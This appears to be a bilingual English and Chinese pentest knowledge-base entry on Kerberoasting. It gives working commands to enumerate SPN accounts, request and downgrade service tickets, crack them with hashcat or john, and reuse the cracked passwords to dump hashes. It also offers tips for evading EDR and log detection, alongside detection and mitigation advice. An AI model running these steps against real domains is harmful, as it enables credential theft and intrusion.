---
id: kerberoasting
title_en: Kerberoasting
title_zh: Kerberoasting：Kerberos 服务票据离线破解
summary_en: Any authenticated domain user can request a service ticket for an account that owns an SPN, then crack it offline. No privilege escalation required, and the cracked password is often a service account with local admin rights somewhere.
summary_zh: 任意一个已认证的域用户都能为注册了 SPN 的账户申请服务票据，然后离线破解。不需要任何提权，而破解出的口令往往属于在别处拥有本地管理员权限的服务账户。
tags: [active-directory, kerberos, spn, password-cracking, windows, credential-access]
tools: [impacket-GetUserSPNs, Rubeus, hashcat, john, PowerView]
attck: [T1558.003]
platform: [windows, linux]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Why it works

A Kerberos service ticket (TGS) is encrypted with a key derived from the password of the account that owns the Service Principal Name (SPN). The KDC will hand out a TGS to *any* authenticated user who asks for it — the ticket itself is the only thing standing between you and the service account's password. The KDC does not check whether you are allowed to use the service, and it does not require the target account to be privileged. So a plain domain user with no special rights can pull a crackable blob out of the domain controller.

Two consequences matter in practice:

1. You only need *some* valid domain credentials. Any low-privileged user, a machine account, or a compromised workstation will do.
2. The crack is fully offline. You never touch the target host again, which makes this one of the quietest ways to obtain a service account password.

The encryption type decides how expensive the crack is:

| etype | Name | Hashcat mode | Notes |
|-------|------|--------------|-------|
| 23 | RC4-HMAC | 13100 | Cheapest by far on GPU. Many environments disable it now. |
| 17 | AES128-CTS-HMAC-SHA1-96 | 19600 | ~100x harder than RC4. |
| 18 | AES256-CTS-HMAC-SHA1-96 | 19700 | Hardest. |

### Step 1 — Find accounts with SPNs

From Linux with a valid credential:

```bash
# -request asks the KDC for the ticket and prints it in hashcat format
impacket-GetUserSPNs corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 -request
```

If you are on a Windows foothold and want to avoid dropping files:

```powershell
# Rubeus, in-memory, no disk artefacts
.\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec
```

With PowerView (part of PowerSploit / an AD attack toolkit):

```powershell
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,admincount
```

Look for accounts that are:

- Members of a privileged group (`Domain Admins`, `Enterprise Admins`), or
- `AdminCount = 1` (meaning they were once privileged), or
- Named like a service (`svc_*`, `sql_*`, `backup_*`) — these usually have local admin somewhere.

### Step 2 — Request the tickets

`GetUserSPNs -request` already does this for every SPN account it finds. If you want a single target, or you are dealing with a host that only permits RC4, request explicitly:

```bash
impacket-GetUserSPNs corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 \
  -request-user svc_sql -outputfile svc_sql.tgs
```

The output looks like this and goes straight into hashcat:

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$8f3c...
```

**Downgrade trick.** Service tickets are encrypted with the *strongest* etype the service account supports. If the account supports AES, the KDC gives you AES and the crack becomes brutal. `Rubeus kerberoast /rc4opsec` deliberately requests RC4 for accounts that still allow it, which is cheaper to crack. The trade-off is that an all-RC4 ticket request is louder in the logs (see Detection below).

### Step 3 — Crack offline

```bash
# RC4 (etype 23) — the common case
hashcat -m 13100 svc_sql.tgs /usr/share/wordlists/rockyou.txt -r best64.rule

# AES128 (etype 17) / AES256 (etype 18)
hashcat -m 19600 svc_sql.tgs wordlist.txt
hashcat -m 19700 svc_sql.tgs wordlist.txt
```

With John:

```bash
john --format=krb5tgs svc_sql.tgs --wordlist=rockyou.txt
```

Service account passwords are disproportionately weak because they are frequently set once, never rotated, and stored in a config file or a scheduled task. `Password1`, `<Company>2024!`, and `<Season><Year>!` patterns pay off remarkably often.

### Step 4 — Use the password

Once cracked, treat it as a plain credential:

```bash
# Validate and see what the account can reach
nxc smb 10.10.10.0/24 -u svc_sql -p 'CrackedPass!' --continue-on-success

# If it is a local admin somewhere, dump hashes
impacket-secretsdump corp.local/svc_sql:'CrackedPass!'@sql01.corp.local
```

### Variants worth knowing

**Targeted Kerberoasting.** If you hold `GenericWrite` (or any write access) over a user object, you can write an SPN onto an account that has none, roast it, then remove the SPN. Effective against accounts with a weak password but no service. The write itself is logged; clean up after yourself.

**AS-REP Roasting** is the sibling technique but a different bug: it targets accounts with "Do not require Kerberos preauthentication" set. Hashcat mode 18200. It needs no valid credentials at all.

### OPSEC and detection

Every request generates **Event ID 4769** on the domain controller. Blue teams look for:

- `TicketEncryptionType = 0x17` (RC4) on a 4769 event — rare in a healthy AES environment and a strong Kerberoasting signal.
- A burst of 4769 events from one user, especially one user requesting tickets for many distinct SPNs in seconds.
- `GetUserSPNs` and `Rubeus` are also caught by EDR by name and behaviour — rename or reflectively load if the engagement calls for it.

To reduce noise: roast a handful of high-value accounts rather than every account with an SPN, avoid `/rc4opsec` in AES-only environments, and check the ticket first — no point requesting all of them if you cannot crack the one that matters.

### Mitigation

- Use **gMSA** (group Managed Service Accounts) where possible: 240-character passwords rotated automatically every 30 days, making offline cracking pointless.
- If gMSA is not possible, set service account passwords to 30+ random characters, stored in a secrets manager — not a script.
- Remove unnecessary SPNs; service accounts should not be Domain Admins. Apply least privilege, and split "can run the service" from "can administer the host".
- Disable RC4 for Kerberos (`msDS-SupportedEncryptionTypes`) so tickets come back AES-encrypted. This raises the cost dramatically.
- Alert on 4769 with RC4 etype, and on unusual SPN enumeration.

<!-- lang:zh -->
### 原理

Kerberos 服务票据（TGS）是用「拥有 SPN 的那个账户」的口令派生出的密钥加密的。KDC 会把 TGS 发给**任何**提出请求的已认证用户 —— 你和那个服务账户口令之间只隔着这一张票据。KDC 不检查你有没有权限使用该服务，也不要求目标账户有特权。所以一个毫无特殊权限的普通域用户，就能从域控上取回一段可离线破解的密文。

实际利用中有两点最关键：

1. 你只需要**任意一个**有效域凭据。低权用户、机器账户、或者一台被拿下的工作站都行。
2. 破解完全离线。你不需要再碰目标主机一次，这使它成为获取服务账户口令最安静的途径之一。

加密类型决定破解成本：

| etype | 名称 | Hashcat 模式 | 说明 |
|-------|------|--------------|------|
| 23 | RC4-HMAC | 13100 | GPU 上便宜得多。现在很多环境已禁用。 |
| 17 | AES128-CTS-HMAC-SHA1-96 | 19600 | 比 RC4 难约 100 倍。 |
| 18 | AES256-CTS-HMAC-SHA1-96 | 19700 | 最难。 |

### 第一步 —— 枚举带 SPN 的账户

Linux 上拿一个有效凭据：

```bash
# -request 会顺便向 KDC 申请票据，并以 hashcat 格式打印
impacket-GetUserSPNs corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 -request
```

如果你已经拿到 Windows 落脚点，想避免落盘：

```powershell
# Rubeus，纯内存，不留磁盘痕迹
.\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec
```

用 PowerView：

```powershell
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,admincount
```

重点看这几类账户：

- 属于特权组（`Domain Admins`、`Enterprise Admins`）的；
- `AdminCount = 1` 的（说明曾经有过特权）；
- 命名像服务的（`svc_*`、`sql_*`、`backup_*`）—— 这些通常在别处有本地管理员权限。

### 第二步 —— 申请票据

`GetUserSPNs -request` 已经替所有找到的 SPN 账户做了这件事。如果你只想要单个目标，或者面对只允许 RC4 的主机，可以显式指定：

```bash
impacket-GetUserSPNs corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 \
  -request-user svc_sql -outputfile svc_sql.tgs
```

输出形如下面这样，可以直接喂给 hashcat：

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$8f3c...
```

**降级技巧。** 服务票据是用服务账户支持的**最强**加密类型加密的。如果该账户支持 AES，KDC 就给你 AES，破解就变得极其昂贵。`Rubeus kerberoast /rc4opsec` 会故意对仍允许 RC4 的账户请求 RC4，破起来便宜得多。代价是全 RC4 的票据请求在日志里更显眼（见下方检测）。

### 第三步 —— 离线破解

```bash
# RC4（etype 23）—— 最常见的情况
hashcat -m 13100 svc_sql.tgs /usr/share/wordlists/rockyou.txt -r best64.rule

# AES128（etype 17）/ AES256（etype 18）
hashcat -m 19600 svc_sql.tgs wordlist.txt
hashcat -m 19700 svc_sql.tgs wordlist.txt
```

用 John：

```bash
john --format=krb5tgs svc_sql.tgs --wordlist=rockyou.txt
```

服务账户的口令普遍偏弱：往往设置一次就再不改、写在配置文件或计划任务里。`Password1`、`<公司名>2024!`、`<季节><年份>!` 这类模式命中率高得出奇。

### 第四步 —— 使用口令

破出来之后，就当一个普通凭据用：

```bash
# 验证凭据并看它能摸到哪些机器
nxc smb 10.10.10.0/24 -u svc_sql -p 'CrackedPass!' --continue-on-success

# 如果它在某处是本地管理员，直接导哈希
impacket-secretsdump corp.local/svc_sql:'CrackedPass!'@sql01.corp.local
```

### 值得知道的变体

**Targeted Kerberoasting（定向烤）。** 如果你对某个用户对象有 `GenericWrite`（或任意写权限），可以给一个原本没有 SPN 的账户写上一个 SPN，烤完再删掉。对那些没有服务但口令很弱的账户特别有效。写操作本身会留日志，事后记得清理。

**AS-REP Roasting** 是同一家族的另一个漏洞：目标是那些设置了「不需要 Kerberos 预认证」的账户，hashcat 模式 18200。它连有效凭据都不需要。

### OPSEC 与检测

每次请求都会在域控上产生 **事件 ID 4769**。蓝队会盯：

- 4769 事件里 `TicketEncryptionType = 0x17`（RC4）—— 在健康的 AES 环境里极少见，是很强的 Kerberoasting 信号；
- 同一个用户在短时间内爆出一批 4769，尤其是对多个不同 SPN 连续请求；
- `GetUserSPNs`、`Rubeus` 也会被 EDR 按名字和行为抓 —— 需要低调时改个名或用反射加载。

降低噪音的做法：只烤少数几个高价值账户，而不是所有带 SPN 的账户；在纯 AES 环境里别用 `/rc4opsec`；先把票据拿到手，破不出来就别再去请求一堆。

### 缓解

- 尽量用 **gMSA**（组托管服务账户）：240 字符口令、每 30 天自动轮换，离线破解变得毫无意义。
- 用不了 gMSA 的，服务账户口令至少 30 位随机字符，存进密钥管理系统 —— 不是写进脚本。
- 清掉多余的 SPN；服务账户不该是 Domain Admins。最小权限，并且把「能跑这个服务」和「能管理这台主机」拆开。
- 为 Kerberos 禁用 RC4（`msDS-SupportedEncryptionTypes`），让票据以 AES 返回，成本立刻上一个数量级。
- 对 RC4 etype 的 4769 事件告警，以及异常的 SPN 枚举行为。
